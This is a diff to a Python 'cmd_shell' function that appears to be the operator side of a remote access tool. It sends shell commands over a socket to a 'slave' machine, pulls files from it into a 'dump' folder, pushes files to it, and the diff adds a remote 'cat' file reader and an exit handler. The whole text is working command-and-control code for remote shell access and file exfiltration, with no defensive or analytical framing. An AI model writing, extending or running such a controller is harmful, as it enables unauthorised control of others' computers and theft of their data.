@@ -77,15 +77,25 @@ def cmd_shell(conn, ip_addr, port, shell_port):
 
         dl = False
         pl = False
+        cat = False
         if shell == 0:
             cmd += str(shell_port)
         if cmd == "clear":
             clear()
+            continue
         if cmd[:2] == "dl":
             dl = True
         if cmd[:2] == "pl":
             pl = True
-
+        if cmd[:3] == "cat":
+            cat = True
+            cmd = "ls"
+        if cmd[:4] == "exit":
+            conn.close()
+            clear()
+            print("[*] Connection with %s:%d closed" % (ip_addr, port))
+            print("[*] Gracefully quitting ...")
+            sys.exit(0)
         try:
             conn.send(cmd.encode())
             if shell == 0:
@@ -98,21 +108,17 @@ def cmd_shell(conn, ip_addr, port, shell_port):
             if dl == True:
                 encoded_data = conn.recv(64000)
                 msg = encoded_data.decode()
-                # while dl == True:
-                #     buf = 1024
-                #     buffer = conn.recv(buf)
-                #     buffer = buffer.decode()
-                #     if buffer == "":
-                #         dl = False
-                #     else:
-                #         data += buffer
                 with open("dump/"+cmd[3:], "w") as fp:
                     fp.write(msg[3:])
             else:
-                encoded_msg = conn.recv(1024)
-                msg = encoded_msg.decode()
+                try:
+                    encoded_msg = conn.recv(1024)
+                    msg = encoded_msg.decode()
+                except socket.error:
+                    sys.stderr.write("[x] Error receiving message")
 
             if pl == True:
+                pls = False
                 clear()
                 os.system("ls")
                 filename = input(">>> ")
@@ -121,18 +127,41 @@ def cmd_shell(conn, ip_addr, port, shell_port):
                 file = data.encode()
                 conn.send(file)
 
+ 
+
             slave_ack = msg[:3]
             msg = msg[3:]
             if slave_ack != "ACK":
-                sys.stderr.write(
-                    "[x] Slave did not acknowledge the command\n")
+                sys.stderr.write("[x] Slave did not acknowledge the command\n")
             elif msg[:3] == "404":
                 print("Error message from slave: %s" % (msg[3:]))
+            elif dl == False:
+                print(msg)
             else:
-                if dl == False:
-                    print(msg)
+                dl = False
+
+            if cat == True:
+                cat = False
+                filename = input(">>> cat ")
+                cmd = "cat" + filename
+                try:
+                    encoded_cmd = cmd.encode()
+                    conn.send(encoded_cmd)
+                except socket.error:
+                    sys.stderr.write("[x] Error sending command\n")
+                try:
+                    encoded_msg = conn.recv(64000)
+                    msg = encoded_msg.decode()
+                except socket.error:
+                    sys.stderr.write("[x] Error receiving message")
+                print(msg)
+                slave_ack = msg[:3]
+                msg = msg[3:]
+                if slave_ack != "ACK":
+                    sys.stderr.write("[x] Slave did not acknowledge the command\n")
                 else:
-                    dl = False
+                    clear()
+                    print(msg)           
         except socket.error:
             sys.stderr.write("[x] Error recving slave ackowledgement\n")
 
